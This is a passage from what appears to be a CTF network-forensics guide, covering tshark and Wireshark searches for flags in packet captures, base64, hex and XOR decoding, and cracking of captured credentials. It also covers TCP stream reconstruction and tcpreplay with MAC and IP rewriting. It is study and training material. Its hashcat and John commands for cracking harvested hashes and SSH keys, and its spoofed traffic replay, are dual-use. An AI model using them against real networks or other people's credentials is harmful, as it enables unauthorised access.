MD5: def456...
```

In Wireshark, use Find (Ctrl+F) with regex enabled to search across all packets:

- Regex: `flag\{[^}]+\}|ctf\{[^}]+\}`
- Search in: Packet List, Packet Details, Packet Bytes

Combine with `tshark`:

```bash
tshark -r challenge.pcap -T fields -e data.data | grep -oP '(?<=flag\{)[^}]+'
```

## Encoding Detection in Strings

Flags are frequently encoded within legitimate protocol data. Recognize encoding signatures:

```
Base64: 4-character blocks + = padding, only [A-Za-z0-9+/=]
Hex: only 0-9a-fA-F, often in pairs or 8-char groups
ROT13: recognizable words shifted 13 positions (use `rot13` tool)
URL Encoding: %XX hex pairs
ASCII Hex: visible hex digits representing printable characters
```

Chain detection with decoding:

```bash
# Detect then decode base64
strings challenge.pcap | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$' | base64 -d

# Detect then decode hex
strings challenge.pcap | grep -E '^[0-9a-f]{40,}$' | xxd -r -p
```

---

# Common CTF Protocols

CTF challenges exploit protocol-specific vulnerabilities or data exposure patterns. Understanding each protocol's flag exfiltration vectors is essential.

## HTTP/HTTPS

**HTTP** (unencrypted):

```bash
# Extract all HTTP requests
tshark -r challenge.pcap -Y "http.request" -T fields -e http.request.method -e http.request.uri -e http.request.full_uri

# Extract HTTP POST data (potential flag submission or exfiltration)
tshark -r challenge.pcap -Y "http.request.method == POST" -T fields -e data.data

# Extract HTTP responses containing potential flags
tshark -r challenge.pcap -Y "http.response" -T fields -e http.response.code -e data.data | strings | grep -i 'flag'
```

Reconstruct HTTP objects via File → Export Objects → HTTP in Wireshark. This recovers images, scripts, files embedded in responses.

**HTTPS** (encrypted but metadata visible):

```bash
# View TLS handshake and certificate data
tshark -r challenge.pcap -Y "tls" -V | grep -A5 "Subject:"

# Extract SNI (Server Name Indication) for domain identification
tshark -r challenge.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name
```

HTTPS challenges often hide flags in certificate fields or require decryption key extraction from keylog files (if provided as separate resource).

## DNS

DNS queries and responses are plaintext unless DoH/DoT is used. Flags appear in query names or response data:

```bash
# All DNS queries
tshark -r challenge.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# DNS responses with answers
tshark -r challenge.pcap -Y "dns.flags.response == 1" -T fields -e dns.qry.name -e dns.a -e dns.txt

# Extract TXT records (common flag location)
tshark -r challenge.pcap -Y "dns.txt" -T fields -e dns.txt
```

DNS exfiltration embeds data in query names (subdomain labels). Use wordlists or regex to extract:

```bash
tshark -r challenge.pcap -Y "dns" -T fields -e dns.qry.name | sed 's/\./\n/g' | sort -u
```

## FTP

FTP transmits credentials and file data in plaintext:

```bash
# FTP credentials
tshark -r challenge.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg

# Extract FTP file transfers
tcpflow -r challenge.pcap | grep -l "^220" | xargs -I {} sh -c 'echo "File: {}"; cat {}'

# Follow FTP data stream (port 20)
tshark -r challenge.pcap -Y "tcp.port == 20" -q -z follow,tcp,raw,0 > ftp_data.bin
```

## SMTP/POP3

Email protocols expose message content, headers, and attachments:

```bash
# SMTP commands and responses
tshark -r challenge.pcap -Y "smtp" -T fields -e smtp.command -e smtp.response.code

# Extract email content (DATA section)
tcpflow -r challenge.pcap -o /tmp/smtp_flows
cat /tmp/smtp_flows/* | grep -A20 "^From:" | head -100

# POP3 list and retrieve
tshark -r challenge.pcap -Y "pop" -T fields -e pop.request -e pop.response
```

## Telnet

Telnet transmits all data including credentials in plaintext:

```bash
# Follow telnet streams
tshark -r challenge.pcap -Y "telnet" -q -z follow,tcp,raw,0

# Extract telnet commands
tshark -r challenge.pcap -Y "telnet" -T fields -e data.data | strings
```

## TFTP

TFTP file transfers lack authentication and use fixed port 69:

```bash
# Identify TFTP transfers
tshark -r challenge.pcap -Y "tftp" -T fields -e tftp.opcode -e tftp.filename

# Extract complete file via tcpflow or manual stream export
tcpflow -r challenge.pcap -g tftp
```

## SSH

SSH encrypts most data but key exchange and version banners are visible. Flags rarely appear unencrypted; focus on metadata:

```bash
# SSH version negotiation
tshark -r challenge.pcap -Y "ssh" -T fields -e ssh.protocol -e ssh.kex.first_kex_packet_follows
```

## IRC

IRC is plaintext and used in botnet/C2 simulations:

```bash
# IRC messages
tshark -r challenge.pcap -Y "irc" -T fields -e data.data | strings | grep -E "PRIVMSG|NOTICE|JOIN"
```

---

# Base64/Hex Encoding Detection

Flags embedded in network data are frequently encoded. Detection requires pattern recognition; decoding follows identification.

## Base64 Detection

Base64 uses 64 characters: `A-Z`, `a-z`, `0-9`, `+`, `/`, with `=` padding.

Signature patterns:

- Multiples of 4 characters (groups of 3 bytes → 4 base64 chars)
- Ends with 0, 1, or 2 `=` characters
- No spaces or special characters except `+`, `/`
- Entropy between 5.5-6.2 (lower than raw binary)

Detection command:

```bash
# Extract potential base64 from PCAP
strings challenge.pcap | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'

# Refine with padding validation
strings challenge.pcap | grep -E '^[A-Za-z0-9+/]*={0,2}$' | awk 'length % 4 == 0 {print}'

# Decode and check validity
strings challenge.pcap | grep -E '^[A-Za-z0-9+/]*={0,2}$' | while read line; do
  decoded=$(echo "$line" | base64 -d 2>/dev/null)
  if [ $? -eq 0 ]; then
    echo "Valid Base64: $line"
    echo "Decoded: $decoded"
  fi
done
```

## Hex Detection

Hex uses only `0-9` and `a-fA-F`. Signatures:

- Even-length strings (hex is 2 chars per byte)
- Only hex digits
- Often prefixed with `0x`
- Entropy between 3.5-4.0 (lower than base64)

Detection:

```bash
# Extract potential hex
strings challenge.pcap | grep -E '^(0x)?[0-9a-fA-F]{20,}$'

# Validate even length and decode
strings challenge.pcap | grep -E '^[0-9a-fA-F]{20,}$' | while read line; do
  if [ $((${#line} % 2)) -eq 0 ]; then
    decoded=$(echo "$line" | xxd -r -p 2>/dev/null | strings)
    echo "Hex string: $line"
    echo "Decoded: $decoded"
  fi
done
```

## Multi-Layer Encoding Detection

Flags may be base64-encoded then hex-encoded (or vice versa). Chain detection:

```bash
# Identify suspect encoded string
suspect="VGhpcyBpcyBhIHRlc3Q="

# Attempt base64 decode → check for hex → decode hex
decoded_b64=$(echo "$suspect" | base64 -d 2>/dev/null)
if echo "$decoded_b64" | grep -qE '^[0-9a-fA-F]+$'; then
  echo "Base64 → Hex detected"
  final=$(echo "$decoded_b64" | xxd -r -p)
  echo "Final: $final"
fi
```

## Automated Encoding Chain Solver

For rapid testing of encoding combinations:

```bash
#!/bin/bash
test_string="$1"
echo "Original: $test_string"

# Try base64
b64=$(echo "$test_string" | base64 -d 2>/dev/null) && echo "Base64 decoded: $b64"

# Try hex
hex=$(echo "$test_string" | xxd -r -p 2>/dev/null) && echo "Hex decoded: $hex"

# Try base64 → hex
b64_first=$(echo "$test_string" | base64 -d 2>/dev/null | xxd -r -p 2>/dev/null) && echo "Base64 → Hex: $b64_first"

# Try hex → base64
hex_first=$(echo "$test_string" | xxd -r -p 2>/dev/null | base64 2>/dev/null) && echo "Hex → Base64: $hex_first"

# Try rot13
rot=$(echo "$test_string" | rot13) && echo "ROT13: $rot"
```

## Contextual Detection in PCAP Streams

Encoding patterns vary by protocol. Apply context-specific detection:

```bash
# HTTP responses often contain base64 (images, encoded payloads)
tshark -r challenge.pcap -Y "http.response" -T fields -e data.data | strings | grep -E '^[A-Za-z0-9+/]{40,}={0,2}$'

# DNS TXT records use hex or base64 for data exfiltration
tshark -r challenge.pcap -Y "dns.txt" -T fields -e dns.txt | grep -E '^[0-9a-fA-F]{40,}$|^[A-Za-z0-9+/]{40,}$'

# FTP file transfers in binary mode may be hex-encoded
tcpflow -r challenge.pcap | file - | grep -q "data" && strings - | grep -E '^[0-9a-fA-F]{100,}$'
```

[Inference] In complex CTF scenarios, expect multi-layer encoding combined with protocol obfuscation. Detection and decoding must chain dynamically based on intermediate results.

---

# XOR Pattern Recognition

XOR encoding appears frequently in CTF challenges due to its simplicity and reversibility. Detecting and breaking XOR requires understanding statistical signatures and key recovery methods.

## XOR Fundamentals and Detection

XOR (exclusive OR) operation: `plaintext XOR key = ciphertext`. Reversing requires `ciphertext XOR key = plaintext`. Single-byte XOR uses one key character repeated; multi-byte XOR cycles through a key sequence.

**Single-byte XOR detection** relies on statistical anomalies. When a single byte XORs plaintext, the resulting ciphertext retains statistical properties of the original:

```bash
# Extract suspect encoded data
strings challenge.pcap | head -20

# Calculate byte frequency distribution
xxd -p suspect_data.bin | tr -d '\n' | fold -w2 | sort | uniq -c | sort -rn | head -10
```

In plaintext, byte frequency follows English language distribution (E, T, A most common in ASCII text). XOR-encoded text shows flattened distribution. If a few bytes dominate (>15% of total), XOR with a small key is likely.

**Visual detection in Wireshark**: Export suspect packet bytes (File → Export Packet Bytes). Non-random binary data with repeating patterns indicates XOR. Random-looking data suggests multi-byte XOR or encryption.

## Single-Byte XOR Brute Force

Test all 256 possible keys:

```bash
# Extract data to file
tshark -r challenge.pcap -Y "tcp.port == 8888" -T fields -e data.data > suspect.hex
xxd -r -p suspect.hex > suspect.bin

# Python brute force all single-byte keys
python3 << 'EOF'
import sys

def xor_single_byte(data, key):
    return bytes([b ^ key for b in data])

with open('suspect.bin', 'rb') as f:
    ciphertext = f.read()

for key in range(256):
    decrypted = xor_single_byte(ciphertext, key)
    # Check for printable ASCII or common patterns
    if decrypted.count(b'flag') > 0 or decrypted.count(b'ctf') > 0:
        print(f"Key 0x{key:02x}: {decrypted[:100]}")
    elif all(32 <= b < 127 or b in [9, 10, 13] for b in decrypted[:50]):
        print(f"Key 0x{key:02x} (printable): {decrypted[:100]}")
EOF
```

Refined detection: flag formats appear predictably in plaintext. Search for `flag{`, `ctf{`, or known phrases:

```bash
python3 << 'EOF'
import sys

def xor_single_byte(data, key):
    return bytes([b ^ key for b in data])

with open('suspect.bin', 'rb') as f:
    ciphertext = f.read()

patterns = [b'flag{', b'ctf{', b'FLAG{', b'admin', b'password', b'secret']

for key in range(256):
    decrypted = xor_single_byte(ciphertext, key)
    for pattern in patterns:
        if pattern in decrypted:
            print(f"\n✓ Key 0x{key:02x} found pattern '{pattern.decode(errors='ignore')}'")
            print(f"Decrypted:\n{decrypted.decode(errors='ignore')[:500]}")
            break
EOF
```

## Multi-Byte XOR Key Recovery

When XOR uses repeating keys (common in CTFs), identify key length using Kasiski examination or Index of Coincidence:

**Kasiski Examination**: Find repeated byte sequences in ciphertext. Distance between repeats often reveals key length (GCD of distances).

```bash
python3 << 'EOF'
import re

def find_key_length(ciphertext):
    # Find repeated 4-byte sequences
    sequences = {}
    for i in range(len(ciphertext) - 3):
        seq = ciphertext[i:i+4]
        if seq in sequences:
            distance = i - sequences[seq]
            print(f"Repeat at distance {distance}")
        else:
            sequences[seq] = i
    
    # Collect distances and find GCD
    from math import gcd
    distances = []
    for i in range(len(ciphertext) - 3):
        seq = ciphertext[i:i+4]
        for j in range(i + 1, len(ciphertext) - 3):
            if ciphertext[j:j+4] == seq:
                distances.append(j - i)
    
    if distances:
        result = distances[0]
        for d in distances[1:]:
            result = gcd(result, d)
        return result
    return None

with open('suspect.bin', 'rb') as f:
    ciphertext = f.read()

key_length = find_key_length(ciphertext)
print(f"Probable key length: {key_length}")
EOF
```

**Index of Coincidence (IC)**: Measures how likely two randomly selected characters are identical. Natural English text has IC ≈ 0.065; random data ≈ 0.038.

```bash
python3 << 'EOF'
def index_of_coincidence(data):
    frequencies = [0] * 256
    for byte in data:
        frequencies[byte] += 1
    
    ic = sum(f * (f - 1) for f in frequencies) / (len(data) * (len(data) - 1))
    return ic

# Test suspected key lengths
with open('suspect.bin', 'rb') as f:
    ciphertext = f.read()

for key_len in range(1, 20):
    # Group bytes by position modulo key_len
    groups = [[] for _ in range(key_len)]
    for i, byte in enumerate(ciphertext):
        groups[i % key_len].append(byte)
    
    avg_ic = sum(index_of_coincidence(bytes(g)) for g in groups) / key_len
    print(f"Key length {key_len}: IC = {avg_ic:.4f}")
EOF
```

Once key length is determined, treat each position as single-byte XOR:

```bash
python3 << 'EOF'
def xor_decrypt(ciphertext, key):
    return bytes([ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext))])

def xor_single_byte(data, key):
    return bytes([b ^ key for b in data])

with open('suspect.bin', 'rb') as f:
    ciphertext = f.read()

key_length = 5  # Assumed from IC analysis

# Brute force each key byte position
key = []
for pos in range(key_length):
    # Extract bytes at this position
    position_bytes = bytes([ciphertext[i] for i in range(pos, len(ciphertext), key_length)])
    
    best_key = 0
    best_score = 0
    
    for test_key in range(256):
        decrypted = xor_single_byte(position_bytes, test_key)
        # Score based on letter frequency (E, T, A common)
        score = sum(decrypted.count(ord(c)) for c in 'etaoinshrdlcumwfgypbvkjxqz')
        if score > best_score:
            best_score = score
            best_key = test_key
    
    key.append(best_key)
    print(f"Position {pos}: 0x{best_key:02x} ('{chr(best_key) if 32 <= best_key < 127 else '?'}')")

print(f"\nRecovered key: {bytes(key)}")
print(f"Decrypted:\n{xor_decrypt(ciphertext, bytes(key)).decode(errors='ignore')}")
EOF
```

## Known-Plaintext XOR Attack

If challenge hints suggest plaintext content (e.g., "flag is hidden in this image description"), recover key directly:

```bash
python3 << 'EOF'
def recover_xor_key(plaintext, ciphertext):
    """Recover XOR key given plaintext-ciphertext pair"""
    if len(plaintext) > len(ciphertext):
        return None
    key = bytes([plaintext[i] ^ ciphertext[i] for i in range(len(plaintext))])
    return key

# Example: challenge states plaintext starts with "flag{"
known_plaintext = b"flag{"
ciphertext_start = bytes.fromhex("1a2b3c4d5e")  # From PCAP

key = recover_xor_key(known_plaintext, ciphertext_start)
print(f"Recovered key: {key}")

# Verify and decrypt full message
full_ciphertext = bytes.fromhex("1a2b3c4d5e6f7a8b9c")
decrypted = bytes([full_ciphertext[i] ^ key[i % len(key)] for i in range(len(full_ciphertext))])
print(f"Decrypted: {decrypted}")
EOF
```

## XOR in Protocol Context

Identify XOR encoding within specific protocols:

```bash
# HTTP payload XOR detection (check Content-Encoding or suspicious binary responses)
tshark -r challenge.pcap -Y "http.response" -T fields -e data.data > http_responses.hex
xxd -r -p http_responses.hex > http_responses.bin

# FTP binary transfer XOR check
tcpflow -r challenge.pcap -o /tmp/ftp_flows
file /tmp/ftp_flows/* | grep "data" | cut -d: -f1 | while read f; do
  echo "Testing: $f"
  python3 xor_brute.py "$f"
done

# DNS TXT record XOR (sometimes flags exfiltrated as XORed hex)
tshark -r challenge.pcap -Y "dns.txt" -T fields -e dns.txt | while read txt; do
  echo "$txt" | xxd -r -p | python3 xor_brute.py
done
```

---

# Password Cracking from Traffic

Passwords transmitted or hashed in network traffic enable privilege escalation or decrypt sensitive data. CTF challenges frequently embed credentials requiring extraction and cracking.

## Plaintext Password Extraction

Unencrypted protocols expose credentials directly:

```bash
# FTP credentials (USER and PASS commands)
tshark -r challenge.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg | grep -E "USER|PASS"

# Telnet login sequences (entire stream shows username and password)
tshark -r challenge.pcap -Y "telnet" -q -z follow,tcp,raw,0 > telnet_stream.txt
cat telnet_stream.txt | strings | grep -E "[Ll]ogin:|[Pp]assword:"

# HTTP Basic Authentication (base64-encoded in Authorization header)
tshark -r challenge.pcap -Y "http.request" -T fields -e http.request.full_uri -e http.authbasic | grep -v "^$"

# Extract and decode HTTP Basic Auth
tshark -r challenge.pcap -Y "http" -T fields -e http.authbasic | while read auth; do
  echo "$auth" | base64 -d
  echo ""
done

# SMTP credentials (AUTH LOGIN command)
tshark -r challenge.pcap -Y "smtp" -T fields -e smtp.command -e smtp.response | grep -i "auth"
```

For HTTP Basic Auth, credentials follow `Authorization: Basic <base64>` format:

```bash
python3 << 'EOF'
import base64
import re

# Read PCAP HTTP requests
import subprocess
result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http.request', '-T', 'fields', '-e', 'http.authbasic'], 
                       capture_output=True, text=True)

for line in result.stdout.strip().split('\n'):
    if line:
        try:
            decoded = base64.b64decode(line).decode()
            username, password = decoded.split(':', 1)
            print(f"Username: {username}")
            print(f"Password: {password}")
        except:
            pass
EOF
```

## Hash Extraction from Traffic

Hashed credentials appear in authentication protocols. Extract and crack:

```bash
# NTLM hashes (Windows authentication in HTTP/SMTP/etc)
tshark -r challenge.pcap -Y "ntlmssp" -T fields -e ntlmssp.auth.ntlmresponse > ntlm_hashes.txt

# NTLM hash format: user:domain:ntlmv2_response
# Extract with Wireshark: right-click NTLMSSP packet → Follow → TCP Stream

# MD5 hashes in HTTP responses or forms
strings challenge.pcap | grep -E '^[a-f0-9]{32}$' > potential_md5.txt

# SHA1 hashes (40 hex chars)
strings challenge.pcap | grep -E '^[a-f0-9]{40}$' > potential_sha1.txt

# SHA256 hashes (64 hex chars)
strings challenge.pcap | grep -E '^[a-f0-9]{64}$' > potential_sha256.txt
```

## Dictionary and Brute-Force Attacks

Use extracted passwords/hashes with Hashcat or John:

```bash
# Crack MD5 hashes from traffic
hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack NTLM hashes
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack SHA1
hashcat -m 100 -a 0 sha1_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper with specific hash formats
john --format=md5crypt md5_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=ntlm ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Brute force with mask (common patterns like P@ssw0rd!)
hashcat -m 0 -a 3 md5_hashes.txt '?u?l?l?l?d?s' -o cracked.txt
# ?u=uppercase, ?l=lowercase, ?d=digit, ?s=special
```

## Protocol-Specific Password Recovery

**SSH Key Extraction**:

```bash
# SSH private keys sometimes appear in traffic or file transfers
strings challenge.pcap | grep -A30 "BEGIN RSA PRIVATE KEY" > ssh_key.pem
chmod 600 ssh_key.pem

# Crack encrypted SSH key passphrase
ssh2john ssh_key.pem > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**POP3/IMAP Credentials**:

```bash
# POP3 plain and login methods
tshark -r challenge.pcap -Y "pop" -q -z follow,tcp,raw,0 | grep -E "USER|PASS|LOGIN"

# Extract IMAP LOGIN (base64-encoded credentials)
tshark -r challenge.pcap -Y "imap" -T fields -e data.data | strings | grep -E "LOGIN|AUTHENTICATE" -A2
```

**LDAP Bind Credentials**:

```bash
# LDAP simple bind (cleartext or base64)
tshark -r challenge.pcap -Y "ldap.bindRequest" -T fields -e ldap.bindRequest.name -e ldap.bindRequest.authentication
```

## Rainbow Table and Lookup Attacks

Pre-computed hash tables for rapid cracking (when internet access available):

```bash
# Online hash lookup (CyberChef or command-line)
# Note: CTF environments may not have internet; use local tables

# Create local rainbow table from wordlist
python3 << 'EOF'
import hashlib

wordlist = '/usr/share/wordlists/rockyou.txt'
output = 'md5_rainbow.txt'

with open(output, 'w') as out:
    with open(wordlist, 'r', errors='ignore') as f:
        for word in f:
            word = word.strip()
            md5 = hashlib.md5(word.encode()).hexdigest()
            sha1 = hashlib.sha1(word.encode()).hexdigest()
            sha256 = hashlib.sha256(word.encode()).hexdigest()
            out.write(f"{md5} md5:{word}\n{sha1} sha1:{word}\n{sha256} sha256:{word}\n")

print(f"Rainbow table created: {output}")
EOF

# Lookup hashes
grep "^a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6" md5_rainbow.txt
```

## Timing and Statistical Analysis

Some challenges hide password patterns in traffic timing or frequency:

```bash
# Analyze authentication attempt timing
tshark -r challenge.pcap -Y "ftp" -T fields -e frame.time_delta -e ftp.request.command | grep -E "USER|PASS"

# Frequency of failed vs successful attempts
tshark -r challenge.pcap -Y "ftp.response.code == 530" | wc -l  # 530 = login failed
tshark -r challenge.pcap -Y "ftp.response.code == 230" | wc -l  # 230 = login successful

# Hypothesis: high failure count before success suggests brute force, password weak if success on early attempt
```

---

# Reconstructing Communications

Full communication reconstruction enables understanding attack flow, extracting multi-part data, and identifying command sequences.

## TCP Stream Reassembly

TCP packets arrive out-of-order and fragmented. Wireshark reassembles automatically in GUI; command-line requires explicit reconstruction:

```bash
# List all TCP streams
tshark -r challenge.pcap -Y tcp -q -z follow,tcp,raw | head -50

# Extract specific stream (stream 0)
tshark -r challenge.pcap -q -z follow,tcp,raw,0 > stream_0.txt

# Extract stream in hex format
tshark -r challenge.pcap -q -z follow,tcp,hex,0 > stream_0_hex.txt

# Parse output: "Client" and "Server" sections alternate, timestamps included
cat stream_0.txt | head -100
```

Automated stream extraction to individual files:

```bash
python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-q', '-z', 'follow,tcp,raw'], 
                       capture_output=True, text=True)

streams = result.stdout.split('===')
for i, stream in enumerate(streams):
    if stream.strip():
        with open(f'stream_{i}.txt', 'w') as f:
            f.write(stream)
            print(f"Saved stream_{i}.txt")
EOF
```

## UDP Stream and Stateless Protocol Reconstruction

UDP lacks connection state. Reconstruct based on source/destination pairs:

```bash
# Identify UDP conversations
tshark -r challenge.pcap -Y udp -T fields -e ip.src -e udp.srcport -e ip.dst -e udp.dstport | sort -u

# Extract specific UDP flow (e.g., 192.168.1.100:5000 <-> 10.0.0.1:53)
tshark -r challenge.pcap -Y "ip.src == 192.168.1.100 and udp.srcport == 5000 and ip.dst == 10.0.0.1 and udp.dstport == 53" -T fields -e data.data > udp_flow.hex

# Convert to binary
xxd -r -p udp_flow.hex > udp_flow.bin
```

## DNS Query-Response Reconstruction

DNS consists of request-response pairs. Track both directions:

```bash
# Paired DNS queries and responses
tshark -r challenge.pcap -Y dns -T fields -e frame.number -e dns.id -e dns.flags.response -e dns.qry.name -e dns.resp.addr

# Extract query names and responses
tshark -r challenge.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u

# Match responses to queries by DNS transaction ID
python3 << 'EOF'
import subprocess

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'dns', '-T', 'fields', '-e', 'dns.id', '-e', 'dns.flags.response', '-e', 'dns.qry.name', '-e', 'dns.resp.addr'],
                       capture_output=True, text=True)

queries = {}
responses = {}

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 3:
        dns_id = parts[0]
        is_response = parts[1]
        query = parts[2] if len(parts) > 2 else ""
        answer = parts[3] if len(parts) > 3 else ""
        
        if is_response == '0':
            queries[dns_id] = query
        else:
            responses[dns_id] = answer

for dns_id, query in queries.items():
    response = responses.get(dns_id, "")
    print(f"Query: {query} → Response: {response}")
EOF
```

## HTTP Request-Response Pairs

Track HTTP conversations with proper sequencing:

```bash
# All HTTP requests and responses
tshark -r challenge.pcap -Y http -T fields -e frame.number -e http.request.full_uri -e http.request.method -e http.response.code

# Reconstruct full HTTP transactions
python3 << 'EOF'
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-Y', 'http', '-V'],
                       capture_output=True, text=True)

# Parse detailed HTTP structure
current_request = None
for line in result.stdout.split('\n'):
    if 'Hypertext Transfer Protocol' in line:
        if 'Request' in line:
            current_request = {'type': 'request'}
        elif 'Response' in line:
            current_request = {'type': 'response'}
    
    if current_request and 'Request URI:' in line:
        current_request['uri'] = line.split('Request URI:')[1].strip()
    if current_request and 'Referer:' in line:
        current_request['referer'] = line.split('Referer:')[1].strip()
    
    if current_request:
        print(f"{current_request['type']}: {current_request.get('uri', current_request.get('referer', ''))}")
EOF
```

Export HTTP objects (images, files, scripts) for analysis:

```bash
# Export all HTTP objects
# File → Export Objects → HTTP (in Wireshark GUI)

# Command-line extraction
tshark -r challenge.pcap -Y http -T fields -e http.content_encoding -e data.data | while read encoding data; do
  if [ -n "$data" ]; then
    echo "$data" | xxd -r -p > exported_object.bin
    file exported_object.bin
  fi
done
```

## FTP Session Reconstruction

FTP uses separate control (port 21) and data (port 20) connections:

```bash
# FTP control channel commands
tshark -r challenge.pcap -Y "tcp.port == 21" -q -z follow,tcp,raw,0 > ftp_control.txt

# FTP data channel content
tshark -r challenge.pcap -Y "tcp.port == 20 or tcp.port == 50000:60000" -q -z follow,tcp,raw,1 > ftp_data.bin

# Match commands to data transfers
python3 << 'EOF'
import re

with open('ftp_control.txt', 'r') as f:
    control = f.read()

# Extract commands like STOR, RETR, DELE
commands = re.findall(r'(STOR|RETR|DELE|PASS|USER|SYST) (.+)', control)
for cmd, arg in commands:
    print(f"{cmd}: {arg.strip()}")
EOF
```

## Email Session Reconstruction (SMTP/POP3)

Reconstruct complete email transactions:

```bash
# SMTP transmission
tshark -r challenge.pcap -Y "smtp" -q -z follow,tcp,raw,0 > smtp_session.txt

# Parse sender, recipient, subject, body
python3 << 'EOF'
import re

with open('smtp_session.txt', 'r') as f:
    session = f.read()

# Extract key fields
sender = re.search(r'MAIL FROM:<(.+?)>', session)
recipient = re.search(r'RCPT TO:<(.+?)>', session)
subject = re.search(r'Subject: (.+?)[\r\n]', session)

if sender:
    print(f"From: {sender.group(1)}")
if recipient:
    print(f"To: {recipient.group(1)}")
if subject:
    print(f"Subject: {subject.group(1)}")

# Extract body (after DATA command and blank line)
body_match = re.search(r'DATA\r\n(.+?)\r\n\.\r\nQUIT', session, re.DOTALL)
if body_match:
    print(f"Body: {body_match.group(1)[:500]}")
EOF

# POP3 message retrieval
tshark -r challenge.pcap -Y "pop" -q -z follow,tcp,raw,0 > pop_session.txt
```

## Telnet Session Reconstruction

Interactive terminal sessions require exact character-by-character order:

```bash
# Full telnet session with all input/output
tshark -r challenge.pcap -Y "telnet" -q -z follow,tcp,raw,0 > telnet_session.txt

# Commands entered and responses received are interspersed
cat telnet_session.txt

# Extract readable commands (filter control characters)
cat telnet_session.txt | tr -d '\x00-\x08\x0b-\x0c\x0e-\x1f\x7f' > telnet_readable.txt
```

## Multi-Packet Payload Assembly

Some attacks or data transfers span multiple packets. Reassemble in order:

```bash
# Extract payload from sequential packets in specific flow
tshark -r challenge.pcap -Y "ip.src == 192.168.1.10 and ip.dst == 10.0.0.1 and tcp.port == 9999" -T fields -e data.data | while read hex_payload; do
  echo "$hex_payload" | xxd -r -p
done > complete_payload.bin

# Verify reassembly with checksums
md5sum complete_payload.bin
```

## Conversation Mapping and Sequencing

Create timeline of all communications to understand attack progression:

```bash
python3 << 'EOF'
import subprocess
import json
from datetime import datetime

result = subprocess.run(['tshark', '-r', 'challenge.pcap', '-T', 'fields', '-e', 'frame.time_epoch', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'ip.proto', '-e', 'tcp.dstport', '-e', 'udp.dstport', '-e', 'frame.len'],
                       capture_output=True, text=True)

conversations = []
for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 5:
        timestamp = parts[0]
        src_ip = parts[1]
        dst_ip = parts[2]
        proto = parts[3]
        tcp_port = parts[4]
        udp_port = parts[5]
        frame_len = parts[6]
        
        port = tcp_port if tcp_port else udp_port
        proto_name = 'TCP' if proto == '6' else 'UDP' if proto == '17' else proto
        
        conversations.append({
            'time': datetime.fromtimestamp(float(timestamp)).isoformat(),
            'src': src_ip,
            'dst': dst_ip,
            'proto': proto_name,
            'port': port,
            'size': frame_len
        })

# Sort and display
for conv in sorted(conversations, key=lambda x: x['time']):
    print(f"{conv['time']} | {conv['src']} → {conv['dst']}:{conv['port']} ({conv['proto']}) | {conv['size']} bytes")
EOF
```

[Inference] Complete reconstruction requires understanding that fragmented data, out-of-order delivery, and protocol layering can obscure attack sequences. Systematic reassembly from packet timestamps ensures accurate recovery.

---

# Traffic Manipulation & Replay

## tcpreplay Basics

### Core tcpreplay Suite Components

**tcpreplay - Basic Replay**

```bash
# Simple replay at original speed
tcpreplay -i eth0 capture.pcap

# Replay at maximum speed (no timing)
tcpreplay -t -i eth0 capture.pcap

# Replay at specific speed multiplier
tcpreplay -x 2.0 -i eth0 capture.pcap  # 2x speed
tcpreplay -x 0.5 -i eth0 capture.pcap  # Half speed

# Replay with specific bandwidth limit
tcpreplay -M 10 -i eth0 capture.pcap  # 10 Mbps

# Loop replay N times
tcpreplay -l 5 -i eth0 capture.pcap

# Infinite loop until stopped
tcpreplay -l 0 -i eth0 capture.pcap

# Replay with packet-per-second limit
tcpreplay -p 100 -i eth0 capture.pcap  # 100 packets/sec

# Unique IP mode (randomize source IPs)
tcpreplay --unique-ip -i eth0 capture.pcap

# Verbose output with statistics
tcpreplay -v -i eth0 capture.pcap
```

**tcpreplay-edit - Replay with Layer 2/3 Modifications**

```bash
# Change source MAC address
tcpreplay-edit --enet-smac=00:11:22:33:44:55 -i eth0 capture.pcap

# Change destination MAC address
tcpreplay-edit --enet-dmac=AA:BB:CC:DD:EE:FF -i eth0 capture.pcap

# Rewrite source IP
tcpreplay-edit --srcipmap=192.168.1.10:10.0.0.50 -i eth0 capture.pcap

# Rewrite destination IP
tcpreplay-edit --dstipmap=192.168.1.1:10.0.0.1 -i eth0 capture.pcap

# Rewrite entire IP range
tcpreplay-edit --srcipmap=192.168.1.0/24:10.0.0.0/24 -i eth0 capture.pcap

# Change both source and destination IPs
tcpreplay-edit --srcipmap=0.0.0.0/0:10.0.0.100 \
  --dstipmap=0.0.0.0/0:10.0.0.200 -i eth0 capture.pcap

# Fix checksums after editing
tcpreplay-edit --fixcsum --enet-smac=00:11:22:33:44:55 \
  -i eth0 capture.pcap

# Skip broadcast/multicast packets
tcpreplay-edit --skipbroadcast -i eth0 capture.pcap

# Set TTL value
tcpreplay-edit --ttl=64 -i eth0 capture.pcap

# Set TOS/DSCP value
tcpreplay-edit --tos=16 -i eth0 capture.pcap
```

**tcpbridge - Bridge and Modify Between Interfaces**

```bash
# Basic bridge mode (forward between interfaces)
tcpbridge -i eth0 -o eth1

# Bridge with MAC address rewriting
tcpbridge -i eth0 -o eth1 --enet-smac=00:11:22:33:44:55

